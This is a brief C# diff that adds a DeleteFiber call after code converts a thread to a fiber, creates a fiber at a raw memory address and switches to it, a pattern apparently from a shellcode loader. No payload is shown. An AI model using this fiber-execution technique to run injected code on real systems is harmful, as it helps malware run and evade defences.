@@ -50,6 +50,7 @@ public class code
           IntPtr ThreadToFiber = ConvertThreadToFiber( 0 );
           IntPtr PtrToFiber = CreateFiber( 0, lpAddress, IntPtr.Zero );
           SwitchToFiber(PtrToFiber);
+          DeleteFiber(PtrToFiber);
           Marshal.FreeHGlobal(uPtr);
      }
 }
